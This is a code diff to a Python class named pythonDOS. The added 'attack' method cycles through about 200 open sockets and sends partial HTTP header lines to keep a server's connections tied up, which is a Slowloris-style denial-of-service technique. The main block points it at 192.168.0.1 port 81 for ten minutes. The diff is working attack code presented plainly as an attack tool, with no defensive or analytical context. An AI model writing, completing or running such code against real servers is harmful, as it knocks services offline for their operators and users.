@@ -34,6 +34,25 @@ class pythonDOS():
     def getMessage(self, message):
         return (message + "{} HTTP/1.1\r\n".format(str(random.randint(0, 2000)))).encode("utf-8")
 
+    # Attack function, sends all sockets (default 200) to target
+    def attack(self, timeout=sys.maxsize, sleep=15):
+        t, i = time.time(), 0
+        while(time.time() - t < timeout):
+            for s in self._sockets:
+                try:
+                    print("Sending request #{}".format(str(i)))
+                    s.send(self.getMessage("X-a: "))
+                    i += 1
+                except socket.error:
+                    # If socket timeout or fail, remove and create a new one
+                    self._sockets.remove(s)
+                    self._sockets.append(self.newSocket())
+                time.sleep(sleep/len(self._sockets))
+
 # Main function
 if __name__ == "__main__":
-    dos = pythonDOS("192.168.0.236", 81, socketsCount=200)
+    # Create object with sockets
+    dos = pythonDOS("192.168.0.1", 81, socketsCount=200)
+
+    # Start attack to target server
+    dos.attack(timeout=60*10)
